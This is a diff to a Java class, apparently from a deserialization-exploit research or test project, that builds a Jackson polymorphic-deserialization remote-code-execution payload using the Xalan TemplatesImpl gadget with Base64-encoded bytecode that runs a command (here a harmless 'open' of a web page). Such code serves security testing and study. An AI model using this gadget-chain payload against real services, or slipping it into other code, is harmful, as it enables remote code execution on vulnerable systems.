@@ -32,7 +32,6 @@ import com.fasterxml.jackson.databind.node.ArrayNode;
 import com.fasterxml.jackson.databind.node.ObjectNode;
 import javassist.CannotCompileException;
 import javassist.NotFoundException;
-import ser05j.Reflections;
 
 import java.util.Base64;
 
@@ -47,21 +46,16 @@ public class Cage {
     return mapper.readValue(data, Object.class);
   }
 
-  private static byte[] createMaliciousByteCodes()
-      throws IOException, InstantiationException, InvocationTargetException, NoSuchFieldException,
-             IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException,
-             NoSuchMethodException {
+  private static byte[] createExecByteCodes()
+      throws IOException, CannotCompileException, NotFoundException, ClassNotFoundException {
     String[] args = {"open", "http://www.google.com"};
-    Object tpl = TemplatesUtil.createTemplatesImpl(args);
-    return ((byte[][]) Reflections.getFieldValue(tpl, "_bytecodes"))[0];
+    return TemplatesUtil.createExecBytecodes(args, Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"));
   }
 
   private static JsonNode createTemplateValues()
-      throws IOException, InstantiationException, InvocationTargetException, NoSuchFieldException,
-             IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException,
-             NoSuchMethodException {
+      throws IOException, CannotCompileException, NotFoundException, ClassNotFoundException {
     ObjectNode values = mapper.createObjectNode();
-    byte[] byteCodes = createMaliciousByteCodes();
+    byte[] byteCodes = createExecByteCodes();
     String encodedByteCodes = Base64.getEncoder().encodeToString(byteCodes);
 
     ArrayNode transletBytescodes = mapper.createArrayNode();
@@ -73,9 +67,8 @@ public class Cage {
     return values;
   }
 
-  public static String rcePayload() throws
-      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
-      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
+  public static String rcePayload() throws ClassNotFoundException, CannotCompileException,
+                                           NotFoundException, IOException {
     JsonNode templateValues = createTemplateValues();
     ArrayNode wrapperNode = mapper.createArrayNode();
     wrapperNode.add("org.apache.xalan.xsltc.trax.TemplatesImpl");
